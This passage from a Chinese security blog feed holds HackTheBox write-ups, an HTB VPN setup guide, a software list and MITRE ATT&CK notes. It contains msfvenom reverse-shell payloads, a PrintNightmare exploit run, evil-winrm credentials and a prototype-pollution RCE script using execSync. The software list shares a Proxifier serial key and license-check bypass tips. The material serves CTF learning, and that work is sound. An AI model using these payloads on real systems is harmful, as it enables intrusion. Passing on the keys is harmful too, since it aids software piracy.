title="直接获取shell"></a>直接获取shell</h4><p>利用msf 框架实现攻击</p><pre class="language-bash" data-language="bash"><code class="language-bash">use exploit/windows/smb/smb_relay<span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> LHOST <span class="token number">10.10</span>.16.7<span class="token builtin class-name">set</span> smbhost <span class="token number">192.168</span>.0.100<span class="token builtin class-name">set</span> srvport <span class="token number">8080</span>exploit</code></pre><p>失败，估计是没权限</p><h4 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h4><p>evil-winrm是Windows远程管理(WinRM) Shell的终极版本。</p><p>Windows远程管理是“WS 管理协议的 Microsoft 实施，该协议是基于标准 SOAP、不受防火墙影响的协议，允许不同供应商的硬件和操作系统相互操作。而微软将其包含在他们的系统中，是为了便于系统管理员在日常工作中，远程管理服务器，或通过脚本同时管理多台服务器，以提高他们的工作效率。</p><p>此程序可在启用此功能的任何Microsoft Windows服务器上使用（通常端口为5985），当然只有在你具有使用凭据和权限时才能使用。因此，我们说它可用于黑客攻击的后利用/渗透测试阶段。相对于攻击者来说，这个程序能为他们提供更好更简单易用的功能。当然，系统管理员也可以将其用于合法目的，但其大部分功能都集中于黑客攻击/渗透测试。</p><pre class="language-none"><code class="language-none">gem install evil-winrm</code></pre><p>基础使用</p><pre class="language-none"><code class="language-none">evil-winrm  -i 10.10.11.106 -u tony -p 'liltony' </code></pre><h4 id="sbmclient-查看共享文件夹"><a href="#sbmclient-查看共享文件夹" class="headerlink" title="sbmclient 查看共享文件夹"></a>sbmclient 查看共享文件夹</h4><pre class="language-none"><code class="language-none">smbclient -L \\\\192.168.0.21\\ -U tony</code></pre><h3 id="上传payload获取shell"><a href="#上传payload获取shell" class="headerlink" title="上传payload获取shell"></a>上传payload获取shell</h3><p>生成exe payload</p><pre class="language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.7 LPORT=445 -f exe &gt; hack.exe</code></pre><p>通过 evil-winrm 上传到client上，msf 监听端口</p><pre class="language-none"><code class="language-none">use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset LHOST 10.211.55.5set LPORT 445exploit</code></pre><p><img src="/assets/image-20211208142704596.png" alt="image-20211208142704596"></p><p>尝试提权失败</p><pre class="language-none"><code class="language-none">use post/multi/recon/local_exploit_suggesterset SESSION 2run</code></pre><p>执行完无反应，暂停测试</p><h3 id="使用-CVE-2021-1675-提权"><a href="#使用-CVE-2021-1675-提权" class="headerlink" title="使用 CVE-2021-1675 提权"></a>使用 CVE-2021-1675 提权</h3><p>生成 反弹shell Dll,上传到系统上</p><pre class="language-bash" data-language="bash"><code class="language-bash">msfvenom -a x64 -p windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>My IP<span class="token operator">&gt;</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">8000</span> -f dll -o dll.dll</code></pre><p>使用项目  <a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a> </p><p>执行命令</p><pre class="language-bash" data-language="bash"><code class="language-bash">python3 CVE-2021-1675.py driver.htb/tony:passwd@10.10.11.106 <span class="token string">'C:\Users\tony\Documents\dll.dll'</span></code></pre><p>监听端口</p><pre class="language-none"><code class="language-none">nc -lvvp 8000</code></pre><p><img src="/assets/image-20211208164615041.png" alt="image-20211208164615041"></p><p>收到反弹shell</p><p><img src="/assets/image-20211208164747127.png" alt="image-20211208164747127"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我这个菜鸡接触了一个全新的领域，学习了一波知识。但没有系统的概念，导致看到端口也想不出来存在漏洞。还是需要更多的沉淀，学习。多学习window及域相关安全，才能更好做好工作，提升个人能力短板。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</a></li><li><a href="https://www.freebuf.com/sectool/210479.html">https://www.freebuf.com/sectool/210479.html</a></li><li><a href="https://baijiahao.baidu.com/s?id=1714776706313648285&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1714776706313648285&amp;wfr=spider&amp;for=pc</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> SMB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox 加速方法</title>
      <link href="/2021/12/07/hackthebox-jia-su-fang-fa/"/>
      <url>/2021/12/07/hackthebox-jia-su-fang-fa/</url>
      
        <content type="html"><![CDATA[<p>免费HTB，用自己的电脑通过OpenVPN总是连不上。于是计划通过 US的VPS进行中转</p><p>连通后访问流量路径：本地Mac 通过 L2TP/Ipsec 到达 vps，vps通过openvpn连接 HTB网络</p><p>虽然延迟仍然比较高 200-300ms，但是胜在稳定，以下记录搭建方式</p><h2 id="安装openvpn-client"><a href="#安装openvpn-client" class="headerlink" title="安装openvpn client"></a>安装openvpn client</h2><p>vps为Ubuntu系统，安装通过 apt命令进行，非常快捷简单</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> openvpn</code></pre><p>将从HTB 下载下来的openvpn 配置文件上传到vps，新开一个screen，连接到 HTB网络</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">screen</span> -S openvpnopenvpn openvpn.ovpn</code></pre><p>完成后，新开一个vps shell，测试能否正常访问 HTB 节点</p><h2 id="安装L2TP-IPsec"><a href="#安装L2TP-IPsec" class="headerlink" title="安装L2TP/IPsec"></a>安装L2TP/IPsec</h2><p>开启 ipsec 支持</p><pre class="language-none"><code class="language-none">sudo modprobe af_key</code></pre><p>通过docker 快速搭建 L2TP/IPsec,此处使用了项目<a href="https://github.com/hwdsl2/docker-ipsec-vpn-server">https://github.com/hwdsl2/docker-ipsec-vpn-server</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">docker run <span class="token punctuation">\</span>    --name ipsec-vpn-server <span class="token punctuation">\</span>    --restart<span class="token operator">=</span>always <span class="token punctuation">\</span>    -v ikev2-vpn-data:/etc/ipsec.d <span class="token punctuation">\</span>    -p <span class="token number">500</span>:500/udp <span class="token punctuation">\</span>    -p <span class="token number">4500</span>:4500/udp <span class="token punctuation">\</span>    -d --privileged <span class="token punctuation">\</span>    hwdsl2/ipsec-vpn-server</code></pre><p>执行完成后，通过会随机生成用户密码，通过docker日志进行查看</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker logs ipsec-vpn-server</code></pre><h2 id="mac-配置-L2TP"><a href="#mac-配置-L2TP" class="headerlink" title="mac 配置 L2TP"></a>mac 配置 L2TP</h2><p>在网络面板中新增一个 L2TP的链接，输入上面的通过日志查看的账号密码及预共享密钥即可，点击链接进行测试</p><p><img src="/assets/image-20211207165446054.png" alt="image-20211207165446054"></p><h2 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h2><p>最后一步，需要手动添加路由，让HTB网络地址的流量默认通过L2TP 虚拟网卡进行转发</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -S route <span class="token function">add</span> -net <span class="token number">10.10</span>.0.0/16 <span class="token number">192.168</span>.42.1</code></pre><p>最后尽情测试吧</p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-GunShip</title>
      <link href="/2021/12/07/hackthebox-gunship/"/>
      <url>/2021/12/07/hackthebox-gunship/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>题目：Gunship</p><p>难度：VERY EASY</p><p>WEB中最简单的一道题，着实把我难道了，没想到第一个题就将我打到自闭😂😂</p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先观察网页，有一个输入框，输入 artist 的名字即可。</p><p><img src="/assets/image-20211207132506799.png" alt="image-20211207132506799"></p><p>查看源代码  entrypoint.sh ，可以发现flag被添加上随机名后放到了网站的根目录下（爆破需要 (26+26+10)的5次方次 ），爆破不是正常道路</p><p>查看源代码 index.js，一脸懵逼</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> path              <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> express           <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> pug        <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">{</span> unflatten <span class="token punctuation">}</span>     <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'flat'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> router            <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'views/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/api/submit'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token punctuation">{</span> artist <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">unflatten</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>artist<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'Haigh'</span><span class="token punctuation">)</span> <span class="token operator">||</span> artist<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'Westaway'</span><span class="token punctuation">)</span> <span class="token operator">||</span> artist<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'Gingell'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'response'</span><span class="token operator">:</span> pug<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">'span Hello #{user}, thank you for letting us know!'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">{</span> user<span class="token operator">:</span> <span class="token string">'guest'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'response'</span><span class="token operator">:</span> <span class="token string">'Please provide us with the full name of an existing member.'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>搜索writeup,才知道和node 的AST注入有关，可通过注入模板达到RCE的目的 参考<a href="https://sec.stealthcopter.com/htb-ctf-write-up-gunship/">文章</a></p><p>看完没看懂，白嫖 payload 如下：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> requests<span class="token constant">TARGET_URL</span> <span class="token operator">=</span> <span class="token string">'http://localhost:1337'</span><span class="token constant">TARGET_URL</span> <span class="token operator">=</span> <span class="token string">'http://docker.hackthebox.eu:30448'</span># make pollutionr <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token constant">TARGET_URL</span><span class="token operator">+</span><span class="token string">'/api/submit'</span><span class="token punctuation">,</span> json <span class="token operator">=</span> <span class="token punctuation">{</span>   <span class="token string">"artist.name"</span><span class="token operator">:</span><span class="token string">"Gingell"</span><span class="token punctuation">,</span>        <span class="token string">"__proto__.abcdezj"</span><span class="token operator">:</span> <span class="token punctuation">{</span>            <span class="token string">"type"</span><span class="token operator">:</span><span class="token string">"Text"</span><span class="token punctuation">,</span>            <span class="token string">"line"</span><span class="token operator">:</span><span class="token string">"process.mainModule.require('child_process').execSync('ls &gt; /app/static/out')"</span>        <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token constant">TARGET_URL</span><span class="token operator">+</span><span class="token string">'/static/out'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>通过命令执行，将结果输出到文件中，或直接反弹shell即可拿到flag</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><p><a href="https://blog.p6.is/AST-Injection/#Exploit">https://blog.p6.is/AST-Injection/#Exploit</a></p></li><li><p><a href="https://sec.stealthcopter.com/htb-ctf-write-up-gunship/">https://sec.stealthcopter.com/htb-ctf-write-up-gunship/</a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件推荐及常用命令</title>
      <link href="/2021/12/03/ruan-jian-tui-jian-ji-chang-yong-ming-ling/"/>
      <url>/2021/12/03/ruan-jian-tui-jian-ji-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<h2 id="软件推荐"><a href="#软件推荐" class="headerlink" title="软件推荐"></a>软件推荐</h2><p>记录一下各个平台自己在用的软件，及其推荐理由：</p><p>文件上传在百度网盘：</p><table><thead><tr><th>平台</th><th>软件名</th><th>推荐原因</th><th>下载地址/激活方法</th></tr></thead><tbody><tr><td>mac</td><td>Typora</td><td>markdown 编写好用👍</td><td>官网下载最后一个 beta 版(免费，或购买（80+RMB）</td></tr><tr><td>mac</td><td>ProxifierMac3</td><td>mac平台 代理软件(懂得都懂)</td><td>官网下载v3，使用序列号激活<br>3CWNN-WYTP4-SD83W-ASDFR-84KEA</td></tr><tr><td>mac</td><td>Easy_New_File</td><td>mac右键扩展助手</td><td>已PJ</td></tr><tr><td>mac</td><td>Navicat_Premium</td><td>数据库查看</td><td>已PJ</td></tr><tr><td>mac</td><td>IDEA/Pycharm等</td><td>jetbrains系列</td><td>教育邮箱激活</td></tr><tr><td>mac</td><td>ZenTermLite</td><td>securecrt平替</td><td>App Store 免费</td></tr><tr><td>mac</td><td>KeeWeb</td><td>密码管理工具</td><td><a href="https://github.com/keeweb/keeweb">https://github.com/keeweb/keeweb</a></td></tr><tr><td>Mac</td><td>Sublime Text</td><td>文本编辑器</td><td>官网下载，随便找个序列号激活，再hosts文件屏蔽检查</td></tr><tr><td>mac</td><td>腾讯 Lemon</td><td>管理下电脑将就用用</td><td>官网下载</td></tr><tr><td>Mac</td><td>Alfred</td><td>系统增强，替换掉系统自带搜索</td><td>已PJ</td></tr><tr><td>mac</td><td>FileZilla</td><td>免费 FTP/SFTF</td><td>官网下载</td></tr><tr><td>mac</td><td>PD Runner</td><td>无限试用 PD</td><td><a href="https://github.com/lihaoyun6/PD-Runner">https://github.com/lihaoyun6/PD-Runner</a></td></tr><tr><td>docker</td><td>hwdsl2/ipsec-vpn-server</td><td>ipsec vpn</td><td></td></tr><tr><td>docker</td><td>secfa/docker-awvs</td><td>awvs</td><td></td></tr><tr><td>docker</td><td>wpscanteam/wpscan</td><td>wpscan</td><td></td></tr><tr><td>linux</td><td>screen</td><td>从此后台任务不中断</td><td>yum / apt</td></tr><tr><td>chrome</td><td>hacktheTools</td><td>浏览器插件，生成常用命令</td><td></td></tr><tr><td>chrome</td><td>油猴</td><td>安装 百度、csnd、github脚本，优化上网体验</td><td></td></tr><tr><td>chrome</td><td>cookie-injecting-tools</td><td>注入抓到的cookie</td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="终端http代理"><a href="#终端http代理" class="headerlink" title="终端http代理"></a>终端http代理</h3><pre class="language-none"><code class="language-none">export http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;export ALL_PROXY=socks5://127.0.0.1:1080</code></pre><h3 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h3><p>mac</p><pre class="language-none"><code class="language-none">sudo -S route add -net 10.211.55.1/24 10.211.55.2</code></pre><p>windows</p><pre class="language-none"><code class="language-none">mroute -p add 10.0.0.0 mask 255.0.0.0 10.10.10.2#-p  永久添加</code></pre><p>linux</p><pre class="language-none"><code class="language-none">route add -net 192.168.62.0 netmask 255.255.255.0 gw 192.168.1.1</code></pre><h3 id="nc-传送文件"><a href="#nc-传送文件" class="headerlink" title="nc 传送文件"></a>nc 传送文件</h3><p>接收机器 </p><pre class="language-none"><code class="language-none">nc -l 4444 &gt; a.txt</code></pre><p>发送机器</p><pre class="language-none"><code class="language-none">nc  10.10.14.52  4444 &lt; a.txt</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MITRE ATT&amp;CK学习-Navigator</title>
      <link href="/2021/12/03/mitre-att-ck-xue-xi-navigator-er/"/>
      <url>/2021/12/03/mitre-att-ck-xue-xi-navigator-er/</url>
      
        <content type="html"><![CDATA[<p>在上文中，主要了解了 MITRE ATT&amp;CK 攻击模型的一些概念，本文将记录 MITRE的Navigator 工具基础使用。 Navigator 项目地址：<a href="https://github.com/mitre-attack/attack-navigator">https://github.com/mitre-attack/attack-navigator</a></p><h1 id="ATT-amp-CK®-Navigator"><a href="#ATT-amp-CK®-Navigator" class="headerlink" title="ATT&amp;CK® Navigator"></a>ATT&amp;CK® Navigator</h1><blockquote><p>The ATT&amp;CK Navigator is designed to provide basic navigation and annotation of <a href="https://attack.mitre.org/">ATT&amp;CK</a> matrices, something that people are already doing today in tools like Excel. We’ve designed it to be simple and generic - you can use the Navigator to visualize your defensive coverage, your red/blue team planning, the frequency of detected techniques or anything else you want to do. The Navigator doesn’t care - it just allows you to manipulate the cells in the matrix (color coding, adding a comment, assigning a numerical value, etc.). We thought having a simple tool that everyone could use to visualize the matrix would help make it easy to use ATT&amp;CK.</p><p>The principal feature of the Navigator is the ability for users to define layers - custom views of the ATT&amp;CK knowledge base - e.g. showing just those techniques for a particular platform or highlighting techniques a specific adversary has been known to use. Layers can be created interactively within the Navigator or generated programmatically and then visualized via the Navigator.</p></blockquote><p>正如介绍所说，Navigator作为一个攻击矩阵导航器，做了能够在Excel中能做的事。作为一个可视化的页面，可以标注颜色、分数、备注等，可用于红/蓝队构建自己的攻击/防御路线。</p><p>如果要查看在线版，可直接访问 <a href="https://mitre-attack.github.io/attack-navigator/">https://mitre-attack.github.io/attack-navigator/</a> ，可导入APT组织的矩阵图，或创建自己的矩阵图</p><p>以下为本地安装方法：</p><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h2><p>前置条件： node.js 8 +</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">npm</span> <span class="token function">install</span> -g @angular/cli<span class="token function">git</span> clone https://github.com/mitre-attack/attack-navigator.git<span class="token builtin class-name">cd</span> attack-navigator/nav-app/<span class="token function">npm</span> <span class="token function">install</span> </code></pre><p>然后就可以在 <a href="http://localhost:4200/">http://localhost:4200/</a> 查看安装完成的页面</p><p><img src="/assets/image-20211203125439560.png" alt="image-20211203125439560"></p><h2 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h2><p>点击 create New Layer，可以创建一个新的视图，选择我们想要创建的视图后，将会加载json文件</p><p>加载完成后，顶部工具栏，可供我们对矩阵进行修改、标注、导出</p><p><img src="/assets/image-20211203125934378.png" alt="image-20211203125934378"></p><p>同时，Navigator支持导入本地或远程的json文件，或创建自定义的视图。</p><p>比如可以在github中查找知名APT组织的相关矩阵图，如 APT29（可直接从 MITRE官网该组织描述页面中下载json文件或直接在线浏览 ）</p><p>如 <a href="https://attack.mitre.org/groups/G0016/">https://attack.mitre.org/groups/G0016/</a> 页面中，按钮如下：</p><p><img src="/assets/image-20211203130400861.png" alt="image-20211203130400861"></p><p>具体页面中的操作，本文不做介绍，可自行探索</p>]]></content>
      
      
      
        <tags>
            
            <tag> APT </tag>
            
            <tag> MITRE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MITRE ATT&amp;CK学习(1)</title>
      <link href="/2021/12/01/mitre-att-ck-xue-xi-yi/"/>
      <url>/2021/12/01/mitre-att-ck-xue-xi-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="1-MITRE-ATT-amp-CK简介"><a href="#1-MITRE-ATT-amp-CK简介" class="headerlink" title="1.MITRE ATT&amp;CK简介"></a>1.MITRE ATT&amp;CK简介</h2><blockquote><p>MITRE ATT&amp;CK ®是一个全球可访问的基于现实世界观察的对手战术和技术知识库。ATT&amp;CK 知识库被用作在私营部门、政府以及网络安全产品和服务社区中开发特定威胁模型和方法的基础。</p><p>随着 ATT&amp;CK 的成立，MITRE 正在履行其为更安全的世界解决问题的使命——通过将社区聚集在一起开发更有效的网络安全。ATT&amp;CK 是开放的，可供任何个人或组织免费使用。</p></blockquote><p>MITRE  ATT&amp;CK 更像是一个知识库，</p><p>在 MITRE <a href="https://attack.mitre.org/#">官网</a> 主页下方，可以看见攻击矩阵(提供企业及移动 两个方向)。</p><p><img src="/assets/image-20211202100444192.png" alt="image-20211202100444192"></p><p>ATT&amp;CK 框架有三个技术名词：</p><ul><li>Tactics: 战术, 是列标题名，是攻击者为什么使用特定技术的概括性分类。</li><li>Techniques:技术，出现在战术列标题下的每个框中，显示攻击者为完成战术都做了什么。ATT&amp;CK 矩阵为每种技术都分配了一个编号，比如 T1500 或 T1191。</li><li>Procedures:流程，可通过技术框中的链接访问，显示攻击者是如何执行某种技术的。流程提供了攻击者（无论单干还是组团）实施具体技术的更详尽说明。</li></ul><p>学习 att&amp;ck 框架对红蓝队均是有利的:</p><ul><li>红队：可以将该表格视作攻击流程，指导攻击者构建一条完整渗透路径</li><li>蓝队：可以按照该攻击路径，对各个板块进行防御，达到安全能力可视，并且能够对照发现自身薄弱项，了解攻击手法，阻断渗透攻击路径。</li></ul><p>MITRE 提供了几个工具：</p><ul><li><a href="https://github.com/mitre-attack/attack-navigator">navigator</a>：ATT&amp;CK导航器旨在提供ATT&amp;CK矩阵的基本导航和注释。</li><li><a href="https://github.com/mitre/cti">ATT&amp;CK Expressed in STIX</a>：结构化威胁信息表达（STIX）™) 是一种用于交换网络威胁情报（CTI）的语言和序列化格式。</li><li><a href="https://car.mitre.org/">CAR</a>：Cyber Analytics Repository（CAR）是MITRE基于ATT&amp;CK®敌手模型开发的分析知识库。</li><li>so on …</li></ul><p>推荐一些学习资料：</p><ul><li><a href="https://academy.attackiq.com/">https://academy.attackiq.com/</a>  ：注册账号，提供 MITRE ATT&amp;CK 视频教程以及其他红蓝对抗视频</li><li><a href="https://www.mitre.org/sites/default/files/publications/mitre-getting-started-with-attack-october-2019.pdf">https://www.mitre.org/sites/default/files/publications/mitre-getting-started-with-attack-october-2019.pdf</a> ：整合 威胁情报、检测和分析、对手仿真和红队、评估和工程 四个板块的电子书</li><li><a href="https://www.youtube.com/watch?v=bkfwMADar0M">https://www.youtube.com/watch?v=bkfwMADar0M</a>  ：介绍ATT&amp;CK的概述，以及如何将其应用于四个用例的想法。还提供<a href="https://www.slideshare.net/KatieNickels/putting-mitre-attck-into-action-with-what-you-have-where-you-are">幻灯片</a>。</li></ul><p>包含MITRE 定义的攻击各个阶段：</p><h2 id="2-Reconnaissance-侦查"><a href="#2-Reconnaissance-侦查" class="headerlink" title="2.Reconnaissance:侦查"></a>2.<a href="https://attack.mitre.org/tactics/TA0043">Reconnaissance</a>:<strong>侦查</strong></h2><p>对手正试图收集可用于规划未来行动的信息。</p><p>侦察包括涉及对手主动或被动收集可用于支持目标定位的信息的技术。此类信息可能包括受害组织、基础设施或员工/人员的详细信息。攻击者可以利用这些信息来帮助攻击者生命周期的其他阶段，例如使用收集到的信息来计划和执行初始访问、确定妥协后目标的范围和优先级，或者推动和领导进一步的侦察工作。</p><h2 id="3-Resource-Development-资源发展"><a href="#3-Resource-Development-资源发展" class="headerlink" title="3.Resource Development:资源发展"></a>3.<a href="https://attack.mitre.org/tactics/TA0042">Resource Development</a>:<strong>资源发展</strong></h2><p>对手正试图建立他们可以用来支持行动的资源。</p><p>资源开发包括涉及对手创建、购买或破坏/窃取可用于支持目标定位的资源的技术。此类资源包括基础设施、帐户或功能。攻击者可以利用这些资源在攻击者生命周期的其他阶段提供帮助，例如使用购买的域来支持命令和控制、将网络钓鱼电子邮件帐户作为初始访问的一部分，或窃取代码签名证书以帮助防御规避.</p><h2 id="4-Initial-Access-初始访问"><a href="#4-Initial-Access-初始访问" class="headerlink" title="4.Initial Access:初始访问"></a>4.<a href="https://attack.mitre.org/tactics/TA0001">Initial Access</a>:<strong>初始访问</strong></h2><p>对手正试图进入您的网络。</p><p>初始访问包含使用各种进入向量来在网络中获得初始立足点的技术。用于获得立足点的技术包括有针对性的鱼叉式网络钓鱼和利用面向公众的 Web 服务器上的弱点。通过初始访问获得的立足点可能允许继续访问，例如有效帐户和外部远程服务的使用，或者可能由于更改密码而限制使用。</p><h2 id="5-Execution-执行"><a href="#5-Execution-执行" class="headerlink" title="5.Execution:执行"></a>5.<a href="https://attack.mitre.org/tactics/TA0002">Execution</a>:<strong>执行</strong></h2><p>对手试图运行恶意代码。</p><p>执行包含导致在本地或远程系统上运行的由对手控制的代码的技术。运行恶意代码的技术通常与所有其他策略的技术相结合，以实现更广泛的目标，例如探索网络或窃取数据。例如，攻击者可能使用远程访问工具来运行执行远程系统发现的 PowerShell 脚本。</p><h2 id="6-Persistence-持久化"><a href="#6-Persistence-持久化" class="headerlink" title="6.Persistence:持久化"></a>6.<a href="https://attack.mitre.org/tactics/TA0003">Persistence</a>:<strong>持久化</strong></h2><p>对手正试图保持立足点。</p><p>持久性包括攻击者用来在重启、更改凭据和其他可能切断其访问的中断期间保持对系统的访问的技术。用于持久性的技术包括任何访问、操作或配置更改，使它们能够在系统上保持立足点，例如替换或劫持合法代码或添加启动代码。</p><h2 id="7-Privilege-Escalation-提权"><a href="#7-Privilege-Escalation-提权" class="headerlink" title="7.Privilege Escalation:提权"></a>7.<a href="https://attack.mitre.org/tactics/TA0004">Privilege Escalation</a>:<strong>提权</strong></h2><p>对手试图获得更高级别的权限。</p><p>权限提升包括攻击者用来在系统或网络上获得更高级别权限的技术。攻击者通常可以进入并探索具有非特权访问权限的网络，但需要更高的权限才能实现其目标。常见的方法是利用系统弱点、错误配置和漏洞。提升访问权限的示例包括：</p><ul><li>系统/根级别</li><li>本地管理员</li><li>具有管理员权限的用户帐户</li><li>可以访问特定系统或执行特定功能的用户帐户</li></ul><p>这些技术通常与持久性技术重叠，因为让对手持久化的操作系统功能可以在提升的上下文中执行。</p><h2 id="8-Defense-Evasion-防御规避"><a href="#8-Defense-Evasion-防御规避" class="headerlink" title="8.Defense Evasion:防御规避"></a>8.<a href="https://attack.mitre.org/tactics/TA0005">Defense Evasion</a>:<strong>防御规避</strong></h2><p>对手试图避免被发现。</p><p>防御规避包括攻击者用来在整个入侵过程中避免检测的技术。用于防御规避的技术包括卸载/禁用安全软件或混淆/加密数据和脚本。攻击者还利用和滥用受信任的进程来隐藏和伪装他们的恶意软件。当其他战术的技术包括颠覆防御的额外好处时，这里会交叉列出这些技术。</p><h2 id="9-Credential-Access-凭据访问"><a href="#9-Credential-Access-凭据访问" class="headerlink" title="9.Credential Access:凭据访问"></a>9.<a href="https://attack.mitre.org/tactics/TA0006">Credential 